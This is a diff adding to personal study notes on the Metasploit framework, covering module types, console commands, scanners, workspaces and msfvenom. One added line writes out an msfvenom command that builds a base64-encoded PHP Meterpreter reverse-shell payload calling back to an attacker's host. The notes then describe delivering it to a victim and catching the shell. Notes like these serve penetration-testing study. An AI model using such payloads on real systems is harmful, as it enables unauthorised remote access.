@@ -1,6 +1,7 @@
 #-----OVERVIEW
 Exploitation Framework. Allows for easy exploit searching, packaging and execution of exploits and payloads
 
+
 #-----MODULES
 Categorization of tools within the M.S. toolbelt
 1) Auxillery - Supporting modules that are not exploit-related. e.g. Scanners, Web Crawlers
@@ -12,6 +13,7 @@ Categorization of tools within the M.S. toolbelt
 - Stagers: Payloads that setup a communication channel b/t M.S. and the victim. Basically a very small payload that sets the stage for larger payloads later
 - These can be distinguished via a "_" character in the name. shell_reverse_tcp = Single Payload, whereas, shell/reverse_tcp = Stager 
 6) Post - Post-exploit Modules
+
 
 #-----BASIC CMDS and USAGE
 help
@@ -34,6 +36,7 @@ background -> Sends current session to b/g
 sessions -> View all sessions
 sessions -i # -> Foreground chosen session
 
+
 #-----Enumeration & Scanners
 Within auxiliary module, there are a number of scanner and enumerators e.g.
 /scanner/discovery/udp_sweep
@@ -42,3 +45,20 @@ Within auxiliary module, there are a number of scanner and enumerators e.g.
 /smb/scanner/smb/smb.login
 
 Other tools are probably better, but these exist if needed.
+
+
+#-----METASPLOIT DATABASE
+The Postgre SQL db simplifies the process of targetting multiple systems in M.S., and allows you to isolate each system as their own separate workspaces.
+workspace -a <name> -> add a new workspace
+workspace -d <name> -> Delete existing workspace
+workspace <name> -> Move to a workspace
+workspace -h -> help
+
+DB's can be manually added to. Check hosts -h and services -h commands. Also "help" > "db backend command" to see more options
+
+#-----MSFVENOM & MULTIHANDLERS
+Allows for the creation of payloads in different formats (dll, php, exe etc.) for different platforms (unix, windows etc.). For ex. we can create an Meterpreter payload as an exe.
+
+msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> -f raw -e php/base64 -> Create php payload, set the LHOST para for reverse_tcp & encode it w/ base64. Then the idea would be to delivery this payload somehow and get the user the activate
+
+With a payload created, delivered, and about to be executed, we need to catch the returned shell. This is normally done via the Exploit modules, but if we're making a stand-alone payload w/ venom, we need to catch the returned shell. This can be done w/ multihandlers.
